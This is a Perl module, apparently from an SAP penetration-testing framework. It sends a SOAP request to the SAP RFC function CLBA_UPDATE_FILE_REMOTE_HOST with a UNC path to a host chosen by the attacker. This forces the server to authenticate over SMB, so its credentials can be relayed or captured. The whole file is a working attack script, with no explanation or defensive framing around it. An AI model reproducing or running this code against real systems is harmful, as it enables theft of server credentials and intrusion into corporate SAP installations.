#!/usr/bin/perl
# Module SMB relay  (CLBA_UPDATE_FILE_REMOTE_HOST)

# CONFIG
######################
my $desc ="SMB relay  (CLBA_UPDATE_FILE_REMOTE_HOST) \n\t Usage: black.pl .. .. -m id_module <path> \n\t UNC path like this: \\\\192.168.0.101\n"; 
our $funcName="CLBA_UPDATE_FILE_REMOTE_HOSTsmbRelay";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub CLBA_UPDATE_FILE_REMOTE_HOSTsmbRelay()
{
	
	my $path;
	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	<SOAP-ENV:Body>
		<m:CLBA_UPDATE_FILE_REMOTE_HOST xmlns:m="urn:sap-com:document:sap:rfc:functions">
			<DATA_TAB>
				<item>
					<TABNAME>a</TABNAME>
					<NUMMER>0</NUMMER>
					<TEXT>a</TEXT>
					<COLOR>a</COLOR>
					<DATA>a</DATA>
				</item>
			</DATA_TAB>
			<FILE_NAME>%PATH%</FILE_NAME>
		</m:CLBA_UPDATE_FILE_REMOTE_HOST>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
	';
	
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}

	$XML=~s/%PATH%/$path/s;
	
	
	#print "$XML\r\n";
	
	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);

	print "$answer\r\n";
	
	print "\n\n";

}